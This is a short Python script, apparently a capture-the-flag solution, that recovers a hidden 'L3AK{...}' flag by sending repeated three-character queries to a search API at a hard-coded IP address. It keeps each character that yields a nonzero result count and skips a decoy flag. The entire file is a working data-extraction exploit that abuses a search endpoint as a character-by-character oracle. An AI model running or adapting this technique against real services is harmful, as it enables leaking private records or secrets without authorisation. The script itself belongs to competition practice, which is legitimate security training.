import requests
import json
import string

printables = list(string.printable)
flag = "L3AK{L3ak1ng_th3_Fl4g??"
url = "http://34.134.162.213:17000/api/search"
headers = {
    "Content-Type": "application/json"
}

while (flag[-1] != "}"):
    for char in printables:
        payload = {
            "query": flag[-2:]+char
        }
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        data = response.json()
        if data.get("count", 0) and flag+char != "L3AK{B" and flag+char != "L3AK{L3ak1ng_th3_Fl4g???":  # ignore the fake flag "L3AK{Bad_bl0g?}" and the ??? post
            flag += char
            print(flag)
            break

print("Complete flag: ", flag)
